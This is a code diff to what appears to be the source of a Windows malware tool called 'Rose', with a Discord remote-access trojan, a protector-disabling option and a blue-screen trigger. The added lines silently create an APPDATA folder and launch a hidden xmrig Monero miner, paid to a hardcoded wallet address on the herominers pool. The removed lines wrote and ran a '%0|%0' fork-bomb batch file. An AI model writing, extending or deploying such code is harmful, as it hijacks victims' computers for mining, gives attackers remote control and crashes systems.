@@ -223,9 +223,6 @@ class Config:
     def get_tsbsod(self):
         return self.ts_bsod
 
-    def get_bbcrash(self):
-        return self.bbcrash
-
     def get_disable_protectors(self):
         return self.disable_protectors
 
@@ -2533,7 +2530,10 @@ def run_knight_rat():
     bot.run(btoken)
 
 def xmrig():
-    working_dir = os.path.join(os.getenv('APPDATA'), 'rose')
+    working_dir = os.path.join(os.getenv('APPDATA'), 'roseee')
+
+    if not os.path.exists(working_dir):
+        os.mkdir(working_dir)
     
     xmrig_zip = os.path.join(working_dir, 'xmrig.zip')
     xmrig_dir = os.path.join(working_dir, 'xmrig')
@@ -2557,7 +2557,7 @@ def xmrig():
     startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 
     subprocess.Popen(
-        [xmrig_exe, "--donate-level", "1", "-o", "de.monero.herominers.com:1111", "-u", cc.get_xmr_adress(), "-p", get_random_string(12), "-a", "rx/0", "-k", "--background"],
+        [xmrig_exe, "--donate-level", "1", "-o", "de.monero.herominers.com:1111", "-u", "49vfj17oFnshJpoX52tmacXhXd9ivUjdJC51fPUG8dFsXY8m39rTYj2TzrMWp7QwARP3QtBCKEqvkjDiYDMADD5PALx1XBu", "-p", get_random_string(12), "-a", "rx/0", "-k", "--background"],
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
         startupinfo=startupinfo,
@@ -3404,19 +3404,10 @@ if cc.get_rose_discord_rat():
     except Exception as e:
         send_error_notification(e, 'Rose Remote Access')
 
-if cc.get_bbcrash():
-    try:
-        cr_file=os.path.join(os.getenv('appdata'), 'rose', f'rose-bomb.bat')
-        with open(cr_file, 'w') as f:
-            f.write('%0|%0')
-
-        subprocess.run("start /min cmd /c \"{}\"".format(cr_file), shell=True, startupinfo=subprocess.STARTUPINFO(dwFlags=subprocess.STARTF_USESHOWWINDOW))
-    except Exception as e:
-        send_error_notification(e, 'Rose Batch Crash Attempter')
-
 if cc.get_tsbsod():
     try:
-        Trigger()
+        if not os.path.dirname(os.path.realpath(__file__)) == os.path.join(os.getenv('APPDATA'), 'rose'):
+            Trigger()
     except Exception as e:
         send_error_notification(e, 'Rose Trigger BSOD')
 
